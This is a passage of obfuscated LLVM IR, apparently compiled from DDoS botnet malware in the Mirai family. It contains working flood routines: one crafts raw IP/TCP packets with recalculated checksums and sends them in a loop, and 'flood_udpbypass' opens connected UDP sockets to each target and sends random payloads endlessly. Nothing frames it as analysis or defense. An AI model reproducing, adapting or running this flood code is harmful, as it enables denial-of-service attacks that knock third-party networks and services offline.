  %219 = icmp eq i16 %218, -1
  br i1 %219, label %220, label %221

; <label>:220:                                    ; preds = %216
  store i16 0, i16* %217, align 4
  br label %221

; <label>:221:                                    ; preds = %220, %216
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 1, i32 3
  %223 = bitcast i16* %222 to i32*
  %224 = load i32, i32* %223, align 4
  %225 = icmp eq i32 %224, 65535
  br i1 %225, label %226, label %227

; <label>:226:                                    ; preds = %221
  store i32 0, i32* %223, align 4
  br label %227

; <label>:227:                                    ; preds = %226, %221
  %228 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 1, i32 5
  %229 = bitcast i8* %228 to i32*
  %230 = load i32, i32* %229, align 4
  %231 = icmp eq i32 %230, 65535
  br i1 %231, label %232, label %233

; <label>:232:                                    ; preds = %227
  store i32 0, i32* %229, align 4
  br label %233

; <label>:233:                                    ; preds = %232, %227
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 0, i32 7
  store i16 0, i16* %234, align 2
  %235 = bitcast %struct.iphdr* %189 to i16*
  %236 = call zeroext i16 @ip_header_checksum(i16* %235, i32 20) #13
  store i16 %236, i16* %234, align 2
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 1, i32 9
  %238 = bitcast i32* %237 to i16*
  store i16 0, i16* %238, align 4
  %239 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i64 0, i32 0
  %240 = call zeroext i16 @htons(i16 zeroext %123) #14
  %241 = call zeroext i16 @tcp_udp_header_checksum(%struct.iphdr* nonnull %189, i8* %239, i16 zeroext %240, i32 %124) #13
  store i16 %241, i16* %238, align 4
  store i16 2, i16* %125, align 4
  %242 = load i16, i16* %212, align 2
  store i16 %242, i16* %126, align 2
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i64 0, i32 9
  %244 = load i32, i32* %243, align 4
  store i32 %244, i32* %127, align 4
  %245 = getelementptr inbounds i32, i32* %40, i64 %indvars.iv
  %246 = load i32, i32* %245, align 4
  %247 = call i64 @sendto(i32 %246, i8* nonnull %195, i64 %128, i32 16384, %struct.sockaddr* nonnull %129, i32 16) #13
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %248 = load i8, i8* %31, align 1
  %249 = zext i8 %248 to i64
  %250 = icmp slt i64 %indvars.iv.next, %249
  br i1 %250, label %.lr.ph, label %.loopexit.loopexit
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define void @flood_tcp_ack_connect(%struct.arguments* nocapture) #11 {
  ret void
}

; Function Attrs: noinline noreturn nounwind uwtable
define void @flood_udpbypass(%struct.arguments* nocapture readonly) #8 {
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 3
  %5 = load i8, i8* %4, align 1
  %6 = zext i8 %5 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 4) #13
  %8 = bitcast i8* %7 to i32*
  %9 = icmp eq i8* %7, null
  br i1 %9, label %22, label %.preheader36

.preheader36:                                     ; preds = %1
  %10 = icmp eq i8 %5, 0
  br i1 %10, label %.preheader.preheader, label %.lr.ph42

.lr.ph42:                                         ; preds = %.preheader36
  %11 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 1
  %12 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 2
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 0
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 1
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %16 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  %19 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 0
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  %21 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  br label %23

; <label>:22:                                     ; preds = %1
  tail call void @exit(i32 1) #15
  unreachable

; <label>:23:                                     ; preds = %.lr.ph42, %47
  %indvars.iv45 = phi i64 [ 0, %.lr.ph42 ], [ %indvars.iv.next46, %47 ]
  %24 = load %struct.option*, %struct.option** %11, align 8
  %25 = load i8, i8* %12, align 8
  %26 = call i32 @rand() #13
  %27 = srem i32 %26, 65482
  %28 = add nsw i32 %27, 53
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @retrieve_opt_num(%struct.option* %24, i8 zeroext %25, i8 zeroext 1, i16 zeroext %29)
  %31 = call i32 @socket(i32 2, i32 2, i32 0) #13
  %32 = getelementptr inbounds i32, i32* %8, i64 %indvars.iv45
  store i32 %31, i32* %32, align 4
  %33 = icmp eq i32 %31, -1
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %23
  call void @exit(i32 1) #15
  unreachable

; <label>:35:                                     ; preds = %23
  store i16 2, i16* %13, align 4
  store i16 0, i16* %14, align 2
  store i32 0, i32* %15, align 4
  %36 = call i32 @bind(i32 %31, %struct.sockaddr* nonnull %16, i32 16) #13
  store i16 2, i16* %17, align 4
  %37 = call zeroext i16 @htons(i16 zeroext %30) #14
  store i16 %37, i16* %18, align 2
  %38 = load %struct.target*, %struct.target** %19, align 8
  %39 = getelementptr inbounds %struct.target, %struct.target* %38, i64 %indvars.iv45, i32 1
  %40 = load i16, i16* %39, align 4
  %41 = icmp ult i16 %40, 32
  %42 = getelementptr inbounds %struct.target, %struct.target* %38, i64 %indvars.iv45, i32 0
  %43 = load i32, i32* %42, align 4
  br i1 %41, label %44, label %47

; <label>:44:                                     ; preds = %35
  %45 = call i32 @ntohl(i32 %43) #14
  %46 = call i32 @htonl(i32 %45) #14
  br label %47

; <label>:47:                                     ; preds = %35, %44
  %48 = phi i32 [ %46, %44 ], [ %43, %35 ]
  store i32 %48, i32* %20, align 4
  %49 = call i32 @connect(i32 %31, %struct.sockaddr* nonnull %21, i32 16) #13
  %indvars.iv.next46 = add nuw i64 %indvars.iv45, 1
  %50 = load i8, i8* %4, align 1
  %51 = zext i8 %50 to i64
  %52 = icmp slt i64 %indvars.iv.next46, %51
  br i1 %52, label %23, label %.preheader.preheader.loopexit

.preheader.preheader.loopexit:                    ; preds = %47
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %.preheader.preheader.loopexit, %.preheader36
  %.ph = phi i8 [ 0, %.preheader36 ], [ %50, %.preheader.preheader.loopexit ]
  br label %.preheader

.preheader.loopexit:                              ; preds = %._crit_edge
  br label %.preheader.backedge

.preheader:                                       ; preds = %.preheader.backedge, %.preheader.preheader
  %53 = phi i8 [ %.ph, %.preheader.preheader ], [ %.be, %.preheader.backedge ]
  %54 = icmp eq i8 %53, 0
  br i1 %54, label %.preheader.backedge, label %.lr.ph40.preheader

.preheader.backedge:                              ; preds = %.preheader, %.preheader.loopexit
  %.be = phi i8 [ 0, %.preheader ], [ %67, %.preheader.loopexit ]
  br label %.preheader

.lr.ph40.preheader:                               ; preds = %.preheader
  br label %.lr.ph40

.lr.ph40:                                         ; preds = %.lr.ph40.preheader, %._crit_edge
  %indvars.iv43 = phi i64 [ %indvars.iv.next44, %._crit_edge ], [ 0, %.lr.ph40.preheader ]
  %55 = call i32 @rand() #13
  %56 = srem i32 %55, 436
  %57 = add nsw i32 %56, 1024
  %.mask = and i32 %57, 65535
  %58 = zext i32 %.mask to i64
  %59 = call noalias i8* @malloc(i64 %58) #13
  %60 = icmp eq i32 %.mask, 0
  br i1 %60, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.lr.ph40
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %61 = call i32 @rand() #13
  %62 = trunc i32 %61 to i8
  %63 = getelementptr inbounds i8, i8* %59, i64 %indvars.iv
  store i8 %62, i8* %63, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %58
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.lr.ph40
  %64 = getelementptr inbounds i32, i32* %8, i64 %indvars.iv43
  %65 = load i32, i32* %64, align 4
  %66 = call i64 @send(i32 %65, i8* %59, i64 %58, i32 16384) #13
  %indvars.iv.next44 = add nuw i64 %indvars.iv43, 1
  %67 = load i8, i8* %4, align 1
  %68 = zext i8 %67 to i64
  %69 = icmp slt i64 %indvars.iv.next44, %68
  br i1 %69, label %.lr.ph40, label %.preheader.loopexit
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @rand_new() local_unnamed_addr #11 {
  ret i32 0
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @rand_string(i8* nocapture, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %4 = add i32 %1, -1
  %5 = zext i32 %4 to i64
  %6 = add nuw nsw i64 %5, 1
  call void @llvm.memset.p0i8.i64(i8* %0, i8 97, i64 %6, i32 1, i1 false)
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph.preheader, %2
  ret void
}

attributes #0 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { nounwind readonly }
attributes #13 = { nounwind }
attributes #14 = { nounwind readnone }
attributes #15 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2, !3}
!2 = !{!"llvm.loop.vectorize.width", i32 1}
!3 = !{!"llvm.loop.interleave.count", i32 1}
!4 = distinct !{!4, !5, !2, !3}
!5 = !{!"llvm.loop.unroll.runtime.disable"}
!6 = distinct !{!6, !2, !3}
!7 = distinct !{!7, !5, !2, !3}
